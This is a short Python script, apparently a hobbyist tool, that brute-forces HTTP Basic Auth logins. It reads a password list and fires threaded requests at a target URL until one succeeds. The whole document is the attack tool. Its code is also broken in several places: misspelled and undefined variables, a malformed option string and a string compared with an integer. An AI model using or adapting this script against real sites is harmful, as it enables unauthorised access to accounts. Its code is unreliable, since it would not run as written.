#!/usr/bin/python

import requests
from threading import Thread
import sys
import getopt

global hit

hit = "1"

def banner():
        print ("####################")
        print ("* BASIC BRUTEFORCE  by  ASHWAK *")
        print ("####################")

def usage():
        print ("usage:")
        print ("        -w: url (http://somesite.com")
        print ("        -u: username")
        print ("        -t: threads")
        print ("        -f: password list")
        print ("example: ./auth.py -w https://somesite.com -u admin -t 5 -f pass.txt")

class request_performer(Thread):
        def __init__(self,name,user,url):
                Thread.__init__(self)
                self.password = name.split("\n")[0]
                self.username = user
                self.url = url
                print ("-" + self.password + "-")

        def run(self):
                global hit
                if hit == "1":
                        try:
                                r = requests.get(self.url, auth=(self.username, self.password))
                                if r.status_code == 200:
                                        hit = "0"
                                        print ("[+] Password Found -" + self.password)
                                        sys.exit()
                                else:
                                        print ("[!!]-" + self.password + "is not valid")
                                        i[0] =i[0] -1


                        except Exception :
                                print (e)

def start(argv):
        banner()
        usage()
        try:
                opts,args = getopt.getopt(argv, "u:w:f:t")
        except getopt.GetoptError:
                print ("Error on arguements")
                sys.exit()
        for opt,arg in opts:
                if opt == '-u':
                        user = arg
                elif opt == '-w':
                        url = arg
                elif opt == '-f':
                        passlist = arg
                elif opt == '-t':
                        threads = arg
        try:
                f = open(passlist, "r")
                passwords = f.readlines()
        except:
                print ("[!!] can't open that file")
                sys.exit()

        launcher_thread(passwords,threads,user,url)

def launcher_thread(passwords,th,username,url):
        global i
        i = []
        i.append(0)
        while len(passwords):
                if hit == "1":
                        try:
                                if i[0] < th:
                                        passwd = passwords.pop(0)
                                        i[0] = i[0] + 1
                                        thread = request_performer(paswd, username, url)
                                        thread.start()
                        except KeyboardInterrupt:
                                print ("!! INterrupeted")
                                sys.exit()
                        threads.join()



if __name__ == "__main__":
        try:
                start(sys.argv[1:])
        except KeyboardInterrupt:
                print ("Interrupted!!!")


